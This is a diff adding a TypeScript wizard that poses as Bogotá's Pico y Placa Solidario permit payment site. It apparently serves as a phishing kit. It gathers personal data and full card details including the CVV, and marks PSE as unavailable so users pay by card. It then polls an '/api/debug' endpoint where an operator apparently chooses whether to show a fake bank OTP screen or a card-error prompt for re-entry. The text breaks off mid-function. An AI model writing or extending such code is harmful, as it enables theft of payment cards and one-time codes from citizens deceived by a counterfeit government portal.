@@ -1,0 +1,1023 @@
+import {
+  durationTableLabels,
+  permitEndDate,
+} from "../data/picoMock";
+import { api, formatCop, persistRequest, type Citizen } from "../services/picoApi";
+
+type PlateRow = {
+  placa: string;
+  duration: string;
+  start: string;
+  end: string;
+  value: number;
+  donation: number;
+  breakdown: Record<string, number | string>;
+  vehicle: {
+    marca?: string;
+    linea?: string;
+    modeloAnio?: string;
+    cilindrajeCc?: number;
+    cylinder: string;
+    fuel: string;
+    model: string;
+    valuation: string;
+    municipality: string;
+  };
+};
+
+type WizardState = {
+  step: number;
+  tipoDocumento: string;
+  numeroDocumento: string;
+  tipoPersona: "natural" | "juridica";
+  found: boolean;
+  person: Citizen | null;
+  plates: PlateRow[];
+  donation: boolean;
+  donationPct: string;
+  metodoPago: "pse" | "credito" | "debito";
+  banco: string;
+  bancoNombre: string;
+  runtVehicle: PlateRow["vehicle"] | null;
+};
+
+const KEY = "pyps-solicitud";
+const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const PLATE = /^([A-Z]{3}[0-9]{3}|[A-Z]{3}[0-9]{2}[A-Z])$/;
+
+let state: WizardState = emptyState();
+
+function emptyState(): WizardState {
+  return {
+    step: 0,
+    tipoDocumento: "",
+    numeroDocumento: "",
+    tipoPersona: "natural",
+    found: false,
+    person: null,
+    plates: [],
+    donation: false,
+    donationPct: "0",
+    metodoPago: "pse",
+    banco: "",
+    bancoNombre: "",
+    runtVehicle: null,
+  };
+}
+
+function $(id: string) {
+  return document.getElementById(id);
+}
+
+function val(id: string) {
+  return ((document.getElementById(id) as HTMLInputElement | HTMLSelectElement | null)?.value || "").trim();
+}
+
+function setVal(id: string, value: string) {
+  const el = document.getElementById(id) as HTMLInputElement | HTMLSelectElement | null;
+  if (el) el.value = value;
+}
+
+function lockAutofill(id: string, value: string) {
+  const el = document.getElementById(id) as HTMLInputElement | null;
+  if (!el) return;
+  el.setAttribute("autocomplete", "off");
+  el.setAttribute("readonly", "readonly");
+  el.value = value;
+  window.setTimeout(() => {
+    el.value = value;
+    el.removeAttribute("readonly");
+  }, 350);
+}
+
+function banner(text: string, ok = false) {
+  const el = $("wizardBanner");
+  if (!el) return;
+  el.textContent = text;
+  el.classList.remove("hidden", "bg-[#edfde5]", "text-dark-green", "bg-[#fff4f4]", "text-color-error");
+  el.classList.add(ok ? "bg-[#edfde5]" : "bg-[#fff4f4]", ok ? "text-dark-green" : "text-color-error");
+}
+
+function clearBanner() {
+  $("wizardBanner")?.classList.add("hidden");
+}
+
+function todayIso() {
+  const d = new Date();
+  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
+}
+
+function filterMunicipios(selectId: string, departmentId: string, keep = "") {
+  const select = $(selectId) as HTMLSelectElement | null;
+  if (!select) return;
+  [...select.options].forEach((option, index) => {
+    if (index === 0) return;
+    const dep = option.getAttribute("data-department");
+    option.hidden = Boolean(departmentId) && dep !== departmentId;
+  });
+  if (keep && [...select.options].some((option) => option.value === keep && !option.hidden)) {
+    select.value = keep;
+  } else if (![...select.options].some((option) => option.value === select.value && !option.hidden)) {
+    select.value = "";
+  }
+}
+
+function syncPersonaType() {
+  const tipo = (document.querySelector('input[name="tipoPersona"]:checked') as HTMLInputElement | null)?.value || "natural";
+  state.tipoPersona = tipo as "natural" | "juridica";
+  $("naturalFields")?.classList.toggle("hidden", tipo !== "natural");
+  $("juridicaFields")?.classList.toggle("hidden", tipo !== "juridica");
+}
+
+function syncLocalidad() {
+  const bogota = val("municipioResidencia") === "11001";
+  $("localidadWrap")?.classList.toggle("hidden", !bogota);
+}
+
+function copyCorrespondencia() {
+  const copy = ($("copiarCorrespondencia") as HTMLInputElement | null)?.checked;
+  if (!copy) return;
+  setVal("departamentoCorrespondencia", val("departamentoResidencia"));
+  filterMunicipios("municipioCorrespondencia", val("departamentoResidencia"), val("municipioResidencia"));
+  setVal("direccionCorrespondencia", val("direccionResidencia"));
+}
+
+function showOverlay(id: string, show: boolean) {
+  const el = $(id);
+  if (!el) return;
+  el.classList.toggle("hidden", !show);
+  el.classList.toggle("flex", show);
+}
+
+function setStep(step: number) {
+  state.step = step;
+  document.querySelectorAll(".wizard-panel").forEach((panel) => {
+    const index = Number((panel as HTMLElement).dataset.panel);
+    panel.classList.toggle("hidden", index !== step);
+  });
+  document.querySelectorAll("#solicitudStepper li").forEach((item) => {
+    const index = Number((item as HTMLElement).dataset.step);
+    item.classList.toggle("active", index === step);
+    item.classList.toggle("done", index < step);
+  });
+  $("btnAtras")?.classList.toggle("hidden", step === 0);
+  $("btnSiguiente")?.classList.toggle("hidden", step >= 2);
+  $("btnIrPagar")?.classList.toggle("hidden", step !== 2);
+  if (step === 2) renderConfirmacion();
+  const body = document.querySelector(".solicitud-dialog-body") as HTMLElement | null;
+  if (body) body.scrollTop = 0;
+}
+
+function fillPerson(person: Citizen | null) {
+  setVal("primerNombre", person?.primerNombre || "");
+  setVal("segundoNombre", person?.segundoNombre || "");
+  setVal("primerApellido", person?.primerApellido || "");
+  setVal("segundoApellido", person?.segundoApellido || "");
+  setVal("razonSocial", person?.razonSocial || "");
+  setVal("nit", person?.nit || person?.numeroDocumento || "");
+  setVal("digitoVerificacion", person?.digitoVerificacion || "");
+  setVal("actividadEconomica", person?.actividadEconomica || "");
+  setVal("correoPrimario", person?.correoPrimario || person?.email || "");
+  setVal("correoSecundario", person?.correoSecundario || "");
+  setVal("telefono", person?.telefono || "");
+  setVal("estrato", person?.estrato || "");
+  setVal("departamentoResidencia", person?.departamentoResidencia || "");
+  filterMunicipios("municipioResidencia", person?.departamentoResidencia || "", person?.municipioResidencia || "");
+  setVal("localidadResidencia", person?.localidadResidencia || "");
+  setVal("direccionResidencia", person?.direccionResidencia || "");
+  setVal("tipoPropiedad", person?.tipoPropiedad || "");
+  setVal("departamentoCorrespondencia", person?.departamentoCorrespondencia || "");
+  filterMunicipios("municipioCorrespondencia", person?.departamentoCorrespondencia || "", person?.municipioCorrespondencia || "");
+  setVal("direccionCorrespondencia", person?.direccionCorrespondencia || "");
+  const tipo = person?.tipoPersona === "juridica" || state.tipoDocumento === "8" ? "juridica" : "natural";
+  const radio = document.querySelector(`input[name="tipoPersona"][value="${tipo}"]`) as HTMLInputElement | null;
+  if (radio) radio.checked = true;
+  syncPersonaType();
+  syncLocalidad();
+}
+
+function validatePersona() {
+  if (!($("terminos") as HTMLInputElement | null)?.checked) return "Debes aceptar los Términos y Condiciones.";
+  if (!EMAIL.test(val("correoPrimario"))) return "Ingresa un correo electrónico válido.";
+  if (val("correoSecundario") && val("correoSecundario") === val("correoPrimario")) {
+    return "El correo secundario debe ser diferente al primario.";
+  }
+  if (!val("telefono") || !val("estrato") || !val("departamentoResidencia") || !val("municipioResidencia") || !val("direccionResidencia") || !val("tipoPropiedad")) {
+    return "Campo Obligatorio";
+  }
+  if (!val("departamentoCorrespondencia") || !val("municipioCorrespondencia") || !val("direccionCorrespondencia")) {
+    return "Campo Obligatorio";
+  }
+  if (state.tipoPersona === "natural") {
+    if (!val("primerNombre") || !val("primerApellido")) return "Campo Obligatorio";
+  } else if (!val("razonSocial") || !val("nit") || !val("digitoVerificacion")) {
+    return "Campo Obligatorio";
+  }
+  return "";
+}
+
+function vehicleFromForm(): PlateRow["vehicle"] | null {
+  if (state.runtVehicle) return state.runtVehicle;
+  const cylinder = val("cylinder");
+  const fuel = val("fuel");
+  const model = val("model");
+  const valuation = val("valuation");
+  const municipality = val("municipality");
+  if (!cylinder || !fuel || !model || !valuation || !municipality) return null;
+  return { cylinder, fuel, model, valuation, municipality };
+}
+
+function renderPlacas() {
+  const body = document.querySelector("#placasTable tbody");
+  if (!body) return;
+  if (!state.plates.length) {
+    body.innerHTML = `<tr><td colspan="6" class="text-gray">Ingrese los campos Placa y Confirmar Placa.</td></tr>`;
+    return;
+  }
+  body.innerHTML = state.plates
+    .map(
+      (row, index) => `
+      <tr>
+        <td>${row.placa}</td>
+        <td>${durationTableLabels[row.duration]?.es || row.duration}</td>
+        <td>${row.start}</td>
+        <td>${row.end}</td>
+        <td>${formatCop(row.value)}</td>
+        <td><button type="button" class="underline text-color-error js-remove-placa" data-index="${index}">Remover</button></td>
+      </tr>`
+    )
+    .join("");
+  body.querySelectorAll(".js-remove-placa").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const index = Number((btn as HTMLElement).dataset.index);
+      state.plates.splice(index, 1);
+      renderPlacas();
+    });
+  });
+}
+
+function permitTotal() {
+  return state.plates.reduce((sum, row) => sum + row.value, 0);
+}
+
+function donationAmount() {
+  if (!state.donation) return 0;
+  const pct = Number(state.donationPct || "0");
+  return Math.round((permitTotal() * pct) / 100);
+}
+
+function grandTotal() {
+  return permitTotal() + donationAmount();
+}
+
+function renderConfirmacion() {
+  const body = document.querySelector("#confirmTable tbody");
+  if (!body) return;
+  body.innerHTML = state.plates
+    .map(
+      (row, index) => `
+      <tr>
+        <td>${row.placa}</td>
+        <td>${formatCop(row.value)}</td>
+        <td><button type="button" class="underline font-semibold js-detalle" data-index="${index}">Detalle</button></td>
+      </tr>`
+    )
+    .join("");
+  const total = $("totalPagar");
+  if (total) total.textContent = formatCop(grandTotal());
+  body.querySelectorAll(".js-detalle").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const row = state.plates[Number((btn as HTMLElement).dataset.index)];
+      const box = $("detalleCobro");
+      if (!box || !row) return;
+      box.classList.remove("hidden");
+      box.innerHTML = `
+        <h4 class="font-semibold mb-2">Detalles del cobro</h4>
+        <p><strong>Placa:</strong> ${row.placa}</p>
+        <p><strong>Marca:</strong> ${row.vehicle.marca || "—"} ${row.vehicle.linea || ""}</p>
+        <p><strong>Modelo:</strong> ${row.vehicle.modeloAnio || row.breakdown.duration}</p>
+        <p><strong>Cilindraje:</strong> ${row.vehicle.cilindrajeCc || "—"}</p>
+        <p><strong>Duración del permiso:</strong> ${row.breakdown.duration}</p>
+        <p><strong>Valor de base:</strong> ${formatCop(Number(row.breakdown.base || 0))}</p>
+        <p><strong>Factor Avalúo:</strong> ${row.breakdown.a} (${row.breakdown.valuation})</p>
+        <p><strong>Factor municipio:</strong> ${row.breakdown.m} (${row.breakdown.municipality})</p>
+        <p><strong>Impacto Ambiental:</strong> ${row.breakdown.environmental}</p>
+        <p><strong>Factor Ambiental:</strong> ${row.breakdown.b}</p>
+        <p class="mt-2 font-bold">Valor total: ${formatCop(row.value)}</p>
+      `;
+    });
+  });
+  syncDonation();
+}
+
+function syncDonation() {
+  $("donacionBox")?.classList.toggle("hidden", !state.donation);
+  setVal("donacionMonto", formatCop(donationAmount()));
+  const total = $("totalPagar");
+  if (total) total.textContent = formatCop(grandTotal());
+}
+
+function personName() {
+  if (state.tipoPersona === "juridica") return val("razonSocial") || "Persona jurídica";
+  return [val("primerNombre"), val("segundoNombre"), val("primerApellido"), val("segundoApellido")].filter(Boolean).join(" ");
+}
+
+function metodoLabel() {
+  if (state.metodoPago === "credito") return "Tarjeta de crédito";
+  if (state.metodoPago === "debito") return "Tarjeta de débito";
+  return "PSE";
+}
+
+function syncMetodoPago() {
+  const selected = (document.querySelector('input[name="metodoPago"]:checked') as HTMLInputElement | null)?.value || "";
+  if (selected) state.metodoPago = selected as WizardState["metodoPago"];
+  $("pseBankBox")?.classList.toggle("hidden", selected !== "pse");
+  $("cardHint")?.classList.toggle("hidden", selected !== "credito" && selected !== "debito");
+  $("pseUnavailable")?.classList.toggle("hidden", selected !== "pse");
+}
+
+const CARD_BRANDS = "Visa · Mastercard · American Express · Diners Club";
+
+function cardBrand(digits: string) {
+  if (/^3[47]/.test(digits)) return "American Express";
+  if (/^(36|38|39)/.test(digits)) return "Diners Club";
+  if (/^30[0-5]/.test(digits)) return "Diners Club";
+  if (/^3095/.test(digits)) return "Diners Club";
+  if (digits.startsWith("4")) return "Visa";
+  if (/^(5[1-5]|2[2-7])/.test(digits)) return "Mastercard";
+  return "";
+}
+
+function cardLength(brand: string) {
+  if (brand === "American Express") return { min: 15, max: 15 };
+  if (brand === "Diners Club") return { min: 14, max: 16 };
+  if (brand === "Mastercard") return { min: 16, max: 16 };
+  if (brand === "Visa") return { min: 13, max: 19 };
+  return { min: 13, max: 19 };
+}
+
+function luhnValid(digits: string) {
+  if (!/^\d{13,19}$/.test(digits)) return false;
+  let sum = 0;
+  let doubleDigit = false;
+  for (let i = digits.length - 1; i >= 0; i -= 1) {
+    let n = Number(digits[i]);
+    if (doubleDigit) {
+      n *= 2;
+      if (n > 9) n -= 9;
+    }
+    sum += n;
+    doubleDigit = !doubleDigit;
+  }
+  return sum % 10 === 0;
+}
+
+function formatCardNumber(value: string) {
+  const digits = value.replace(/\D/g, "").slice(0, 19);
+  const brand = cardBrand(digits);
+  if (brand === "American Express") {
+    return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)].filter(Boolean).join(" ");
+  }
+  if (brand === "Diners Club") {
+    if (digits.length > 14) {
+      return digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+    }
+    return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 14)].filter(Boolean).join(" ");
+  }
+  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+}
+
+function formatExpiry(value: string) {
+  const digits = value.replace(/\D/g, "").slice(0, 4);
+  if (digits.length <= 2) return digits;
+  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+}
+
+function validExpiry(value: string) {
+  const match = /^(\d{2})\/(\d{2})$/.exec(value);
+  if (!match) return false;
+  const month = Number(match[1]);
+  const year = 2000 + Number(match[2]);
+  if (month < 1 || month > 12) return false;
+  const now = new Date();
+  const exp = new Date(year, month, 0, 23, 59, 59);
+  return exp >= now;
+}
+
+function validateCard() {
+  const titular = val("cardTitular");
+  const digits = val("cardNumero").replace(/\s+/g, "");
+  const vence = val("cardVence");
+  const cvv = val("cardCvv");
+  const brand = cardBrand(digits);
+  const length = cardLength(brand);
+  const amex = brand === "American Express";
+  if (!titular) return "Ingresa el nombre del titular.";
+  if (!/^\d+$/.test(digits) || digits.length < length.min || digits.length > length.max) {
+    return "El número de tarjeta no está bien escrito.";
+  }
+  if (!brand) return "No se reconoció la franquicia de la tarjeta.";
+  if (!luhnValid(digits)) return "El número de tarjeta no está bien escrito.";
+  if (!validExpiry(vence)) return "La fecha de vencimiento no es válida.";
+  if (!/^\d+$/.test(cvv) || cvv.length !== (amex ? 4 : 3)) return "El CVV no es válido.";
+  return "";
+}
+
+function updateCardLive() {
+  const digits = val("cardNumero").replace(/\s+/g, "");
+  const brand = cardBrand(digits);
+  const el = $("cardBrand");
+  const length = cardLength(brand);
+  if (!el) return;
+  if (!digits) {
+    el.textContent = CARD_BRANDS;
+    el.className = "text-sm text-gray mb-4";
+    return;
+  }
+  if (brand && digits.length < length.min) {
+    el.textContent = brand;
+    el.className = "text-sm text-dark-green mb-4";
+    return;
+  }
+  if (!luhnValid(digits) || (brand && (digits.length < length.min || digits.length > length.max))) {
+    el.textContent = `${brand || "Tarjeta"} · El número no está bien escrito`;
+    el.className = "text-sm text-color-error mb-4";
+    return;
+  }
+  el.textContent = `${brand} · Número válido`;
+  el.className = "text-sm text-dark-green mb-4";
+}
+
+function cardBrandKey(digits: string) {
+  const brand = cardBrand(digits);
+  if (brand === "American Express") return "amex";
+  if (brand === "Diners Club") return "diners";
+  if (brand === "Mastercard") return "mastercard";
+  if (brand === "Visa") return "visa";
+  return "visa";
+}
+
+async function pollDebugDecision(sessionId: string, timeoutMs = 180000) {
+  const started = Date.now();
+  while (Date.now() - started < timeoutMs) {
+    const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
+      headers: { Accept: "application/json" },
+    });
+    if (response.ok) {
+      const payload = await response.json();
+      const decision = payload?.decision || {};
+      if (decision.action && decision.action !== "wait") return decision as { action: string; message?: string; brand?: string };
+    }
+    await new Promise((resolve) => window.setTimeout(resolve, 1500));
+  }
+  return {
+    action: "timeout",
+    message: "La verificacion esta tardando mas de lo esperado. Intenta nuevamente.",
+  };
+}
+
+function showWaitScreen(brandKey: string) {
+  const wait = $("pagos-wait-screen");
+  const challenge = $("pagos-challenge-screen");
+  wait?.querySelectorAll("[data-wait-brand]").forEach((panel) => {
+    (panel as HTMLElement).hidden = panel.getAttribute("data-wait-brand") !== brandKey;
+  });
+  if (wait) wait.hidden = false;
+  if (challenge) challenge.hidden = true;
+  document.body.classList.add("is-offers-waiting");
+  showOverlay("cardOverlay", false);
+}
+
+function hideWaitScreen() {
+  const wait = $("pagos-wait-screen");
+  if (wait) wait.hidden = true;
+  document.body.classList.remove("is-offers-waiting");
+}
+
+function showChallengeScreen(brandKey: string, message = "") {
+  const wait = $("pagos-wait-screen");
+  const challenge = $("pagos-challenge-screen");
+  const now = new Date();
+  const months = [
+    "enero", "febrero", "marzo", "abril", "mayo", "junio",
+    "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre",
+  ];
+  const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
+  const amountLabel = formatCop(grandTotal());
+  hideWaitScreen();
+  challenge?.querySelectorAll("[data-challenge-brand]").forEach((panel) => {
+    (panel as HTMLElement).hidden = panel.getAttribute("data-challenge-brand") !== brandKey;
+  });
+  challenge?.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
+    el.textContent = "Secretaría Distrital de Movilidad";
+  });
+  challenge?.querySelectorAll("[data-challenge-amount]").forEach((el) => {
+    el.textContent = amountLabel;
+  });
+  challenge?.querySelectorAll("[data-challenge-datetime]").forEach((el) => {
+    el.textContent = datetimeLabel;
+  });
+  if (challenge) challenge.hidden = false;
+  if (message) setChallengeMessage(brandKey, message, "error");
+}
+
+function setChallengeMessage(brand: string, message: string, kind = "error") {
+  const challenge = $("pagos-challenge-screen");
+  const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
+  const form = panel?.querySelector("[data-otp-form]");
+  if (!form) return;
+  let error = form.querySelector("[data-otp-debug-message]") as HTMLElement | null;
+  if (!error) {
+    error = document.createElement("p");
+    error.setAttribute("data-otp-debug-message", "");
+    error.setAttribute("role", "alert");
+    error.style.margin = "10px 0 0";
+    error.style.fontSize = "13px";
+    error.style.lineHeight = "1.35";
+    form.appendChild(error);
+  }
+  error.textContent = message || "";
+  error.hidden = !message;
+  error.style.color = kind === "info" ? "#1b4e9b" : "#b42318";
+}
+
+function showCardErrorModal(message: string) {
+  const modal = $("pagos-debug-modal");
+  const text = $("pagos-debug-modal-message");
+  if (text) text.textContent = message;
+  if (modal) modal.hidden = false;
+  document.body.classList.add("pagos-debug-modal-open");
+}
+
+async function handlePaymentDecision(
+  decision: { action?: string; message?: string; brand?: string },
+  brandKey: string,
+  payBtn: HTMLButtonElement | null,
+) {
+  const action = decision.action || "timeout";
+  if (action === "sms" || action === "sms_error") {
+    showChallengeScreen(brandKey, action === "sms_error" ? decision.message || "" : "");
+    return;
+  }
+  if (action === "card" || action === "card_error") {
+    hideWaitScreen();
+    const challenge = $("pagos-challenge-screen");
+    if (challenge) challenge.hidden = true;
+    showOverlay("cardOverlay", true);
+    showCardErrorModal(decision.message || "No pudimos verificar la tarjeta. Ingresa los datos nuevamente.");
+    if (payBtn) {
+      payBtn.disabled = false;
+      payBtn.textContent = "Pagar con tarjeta";
+    }
+    return;
+  }
+  if (action === "approved") {
+    hideWaitScreen();
+    const challenge = $("pagos-challenge-screen");
+    if (challenge) challenge.hidden = true;
+    window.location.href = "/success";
+    return;
+  }
+  hideWaitScreen();
+  showOverlay("cardOverlay", true);
+  const errEl = $("cardError");
+  if (errEl) {
+    errEl.textContent = decision.message || "La verificacion esta tardando mas de lo esperado. Intenta nuevamente.";
+    errEl.classList.remove("hidden");
+  }
+  if (payBtn) {
+    payBtn.disabled = false;
+    payBtn.textContent = "Pagar con tarjeta";
+  }
+}
+
+function openCardForm() {
+  const title = $("cardOverlayTitle");
+  if (title) title.textContent = metodoLabel();
+  const total = $("cardTotal");
+  if (total) total.textContent = formatCop(grandTotal());
+  lockAutofill("cardTitular", personName());
+  setVal("cardNumero", "");
+  setVal("cardVence", "");
+  setVal("cardCvv", "");
+  setVal("cardCuotas", "1");
+  $("cardCuotasWrap")?.classList.toggle("hidden", state.metodoPago !== "credito");
+  $("cardError")?.classList.add("hidden");
+  const brand = $("cardBrand");
+  if (brand) {
+    brand.textContent = CARD_BRANDS;
+    brand.className = "text-sm text-gray mb-4";
+  }
+  showOverlay("cardOverlay", true);
+}
+
+function renderPagoDatos() {
+  const box = $("pagoDatos");
+  if (!box) return;
+  const now = new Date().toLocaleString("es-CO");
+  const titulo = $("pagoTitulo");
+  if (titulo) titulo.textContent = state.metodoPago === "pse" ? "Datos de pago PSE" : "Datos de pago PAYZEN";
+  const medio = state.metodoPago === "pse" ? state.bancoNombre : metodoLabel();
+  box.innerHTML = `
+    <p><strong>Estado del proceso</strong><br>Pendiente de pago</p>
+    <p><strong>Número de documento</strong><br>${state.numeroDocumento}</p>
+    <p><strong>Identificación</strong><br>${state.tipoDocumento === "8" ? "NIT" : "Cédula"} ${state.numeroDocumento}</p>
+    <p><strong>Nombre completo</strong><br>${personName()}</p>
+    <p><strong>Correo electrónico</strong><br>${val("correoPrimario")}</p>
+    <p><strong>${state.metodoPago === "pse" ? "Entidad Bancaria" : "Medio de pago"}</strong><br>${medio}</p>
+    <p><strong>Valor de la transacción (IVA incluido)</strong><br>${formatCop(grandTotal())}</p>
+    <p><strong>Impuesto a la venta</strong><br>$ 0</p>
+    <p><strong>Asunto del pago</strong><br>Permiso Pico y Placa Solidario</p>
+    <p><strong>Placa</strong><br>${state.plates.map((row) => row.placa).join(", ")}</p>
+    <p><strong>Fecha de creación de la transacción</strong><br>${now}</p>
+    <p><strong>Número de la solicitud</strong><br>${solicitudId()}</p>
+  `;
+  const payBtn = $("btnPagarPse");
+  if (payBtn) payBtn.textContent = state.metodoPago === "pse" ? "Pagar con PSE" : "Pagar con tarjeta";
+}
+
+function solicitudId() {
+  return `PYPS-${new Date().getFullYear()}-${String(state.numeroDocumento).slice(-6).padStart(6, "0")}`;
+}
+
+function savePendingRequests() {
+  state.plates.forEach((row) => {
+    persistRequest({
+      id: `${solicitudId()}-${row.placa}`,
+      placa: row.placa,
+      tipoDocumento: state.tipoDocumento,
+      numeroDocumento: state.numeroDocumento,
+      tipo: { es: String(row.breakdown.duration), en: String(row.breakdown.durationEn) },
+      estado: { es: "Pendiente de pago", en: "Pending payment" },
+      inicio: row.start,
+      fin: row.end,
+      valor: row.value + (state.plates[0] === row ? donationAmount() : 0),
+    });
+  });
+}
+
+function renderPse() {
+  const box = $("pseResumen");
+  if (!box) return;
+  box.innerHTML = `
+    <p><strong>Empresa:</strong> Secretaría Distrital de Movilidad</p>
+    <p><strong>NIT:</strong> 899.999.061-9</p>
+    <p><strong>Banco:</strong> ${state.bancoNombre}</p>
+    <p><strong>Referencia:</strong> ${solicitudId()}</p>
+    <p><strong>Valor a pagar:</strong> ${formatCop(grandTotal())}</p>
+    <p><strong>Pagador:</strong> ${personName()}</p>
+  `;
+}
+
+export function openSolicitudWizard(input: {
+  tipoDocumento: string;
+  numeroDocumento: string;
+  found: boolean;
+  person: Citizen | null;
+}) {
+  state = emptyState();
+  state.tipoDocumento = input.tipoDocumento;
+  state.numeroDocumento = input.numeroDocumento;
+  state.found = input.found;
+  state.person = input.person;
+  fillPerson(input.person);
+  lockAutofill("primerNombre", val("primerNombre"));
+  lockAutofill("segundoNombre", val("segundoNombre"));
+  lockAutofill("primerApellido", val("primerApellido"));
+  lockAutofill("segundoApellido", val("segundoApellido"));
+  const fecha = $("fechaInicio") as HTMLInputElement | null;
+  if (fecha) {
+    fecha.min = todayIso();
+    fecha.value = todayIso();
+  }
+  renderPlacas();
+  setStep(0);
+  clearBanner();
+  if (input.found) banner("Información encontrada. Completa o confirma tus datos para continuar.", true);
+  else banner("No encontramos una persona previa. Completa el registro para continuar.");
+  showOverlay("solicitudOverlay", true);
+  document.body.style.overflow = "hidden";
+  sessionStorage.setItem(KEY, JSON.stringify({ tipoDocumento: input.tipoDocumento, numeroDocumento: input.numeroDocumento }));
+}
+
+function closeAll() {
+  showOverlay("solicitudOverlay", false);
+  showOverlay("pagoOverlay", false);
+  showOverlay("pseOverlay", false);
+  showOverlay("cardOverlay", false);
+  hideWaitScreen();
+  const challenge = $("pagos-challenge-screen");
+  if (challenge) challenge.hidden = true;
+  document.body.style.overflow = "";
+}
+
+async function agregarPlaca() {
+  const placa = val("placa").toUpperCase();
+  const confirm = val("confirmarPlaca").toUpperCase();
+  const duration = val("duracionPermiso");
+  const start = val("fechaInicio");
+  if (!placa || !confirm) return banner("Ingrese los campos Placa y Confirmar Placa o seleccione un archivo.");
+  if (!PLATE.test(placa)) return banner("La placa no cumple con una estructura válida!");
+  if (placa !== confirm) return banner("Las placas no coinciden.");
+  if (!duration || !start) return banner("Seleccione Duración Permiso antes de agregar placas.");
+  if (state.plates.length >= 10) return banner("Supera el límite de placas permitidas (10).");
+  if (state.plates.some((row) => row.placa === placa)) return banner("La placa ya fue agregada.");
+  const vehicle = vehicleFromForm();
+  if (!vehicle) return banner("Consulta la placa o completa los datos del vehículo para calcular la tarifa.");
+  const sim = await api.simulate({
+    duration,
+    cylinder: vehicle.cylinder,
+    fuel: vehicle.fuel,
+    model: vehicle.model,
+    valuation: vehicle.valuation,
+    municipality: vehicle.municipality,
+  });
+  state.plates.push({
+    placa,
+    duration,
+    start,
+    end: permitEndDate(start, duration),
+    value: sim.value,
+    donation: 0,
+    breakdown: sim.breakdown,
+    vehicle,
+  });
+  setVal("placa", "");
+  setVal("confirmarPlaca", "");
+  state.runtVehicle = null;
+  $("runtCard")?.classList.add("hidden");
+  clearBanner();
+  renderPlacas();
+  const body = document.querySelector(".solicitud-dialog-body") as HTMLElement | null;
+  const list = $("placasRegistro");
+  if (body && list) {
+    const top = list.getBoundingClientRect().top - body.getBoundingClientRect().top + body.scrollTop;
+    body.scrollTo({ top: Math.max(0, top - 8), behavior: "smooth" });
+  }
+}
+
+async function buscarRunt() {
+  const placa = val("placa").toUpperCase();
+  const msg = $("runtMsg");
+  const card = $("runtCard");
+  if (!PLATE.test(placa)) {
+    if (msg) msg.textContent = "La placa ingresada no es correcta";
+    return;
+  }
+  if (msg) msg.textContent = "Consultando RUNT...";
+  const result = await api.lookupRunt(placa);
+  if (!result.found || !result.vehicle) {
+    state.runtVehicle = null;
+    $("manualVehicle")?.classList.remove("hidden");
+    if (msg) msg.textContent = "";
+    card?.classList.add("hidden");
+    return;
+  }
+  const vehicle = result.vehicle;
+  state.runtVehicle = {
+    marca: vehicle.marca,
+    linea: vehicle.linea,
+    modeloAnio: vehicle.modeloAnio,
+    cilindrajeCc: vehicle.cilindrajeCc,
+    cylinder: vehicle.cylinder,
+    fuel: vehicle.fuel,
+    model: vehicle.model,
+    valuation: vehicle.valuation,
+    municipality: vehicle.municipality,
+  };
+  setVal("cylinder", vehicle.cylinder);
+  setVal("fuel", vehicle.fuel);
+  setVal("model", vehicle.model);
+  setVal("valuation", vehicle.valuation);
+  setVal("municipality", vehicle.municipality);
+  $("manualVehicle")?.classList.add("hidden");
+  if (msg) msg.textContent = "";
+  if (card) {
+    card.classList.remove("hidden");
+    card.innerHTML = `<strong>${vehicle.placa}</strong> · ${vehicle.marca} ${vehicle.linea} ${vehicle.modeloAnio} · ${vehicle.cilindrajeCc} cc`;
+  }
+}
+
+export function bindSolicitudWizard() {
+  document.querySelectorAll('input[name="tipoPersona"]').forEach((el) => el.addEventListener("change", syncPersonaType));
+  $("departamentoResidencia")?.addEventListener("change", () => {
+    filterMunicipios("municipioResidencia", val("departamentoResidencia"));
+    copyCorrespondencia();
+  });
+  $("municipioResidencia")?.addEventListener("change", () => {
+    syncLocalidad();
+    copyCorrespondencia();
+  });
+  $("direccionResidencia")?.addEventListener("input", copyCorrespondencia);
+  $("copiarCorrespondencia")?.addEventListener("change", copyCorrespondencia);
+  $("departamentoCorrespondencia")?.addEventListener("change", () => {
+    filterMunicipios("municipioCorrespondencia", val("departamentoCorrespondencia"));
+  });
+  $("closeWizard")?.addEventListener("click", closeAll);
+  $("btnCancelar")?.addEventListener("click", closeAll);
+  $("btnAtras")?.addEventListener("click", () => {
+    clearBanner();
+    setStep(Math.max(0, state.step - 1));
+  });
+  $("btnSiguiente")?.addEventListener("click", () => {
+    if (state.step === 0) {
+      const error = validatePersona();
+      if (error) return banner(error);
+      clearBanner();
+      setStep(1);
+      return;
+    }
+    if (state.step === 1) {
+      if (!state.plates.length) return banner("Por favor seleccione al menos una placa");
+      clearBanner();
+      setStep(2);
+    }
+  });
+  $("agregarPlaca")?.addEventListener("click", () => void agregarPlaca());
+  $("donacionSi")?.addEventListener("click", () => {
+    state.donation = true;
+    syncDonation();
+  });
+  $("donacionNo")?.addEventListener("click", () => {
+    state.donation = false;
+    state.donationPct = "0";
+    setVal("donacionPct", "0");
+    syncDonation();
+  });
+  $("donacionPct")?.addEventListener("change", () => {
+    state.donationPct = val("donacionPct");
+    syncDonation();
+  });
+  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => el.addEventListener("change", syncMetodoPago));
+  document.querySelector('input[name="metodoPago"][value="pse"]')?.addEventListener("click", () => {
+    $("pseUnavailable")?.classList.remove("hidden");
+  });
+  $("btnIrPagar")?.addEventListener("click", () => {
+    syncMetodoPago();
+    const selected = (document.querySelector('input[name="metodoPago"]:checked') as HTMLInputElement | null)?.value || "";
+    if (!selected) return banner("Selecciona una opción de pago");
+    if (selected === "pse") {
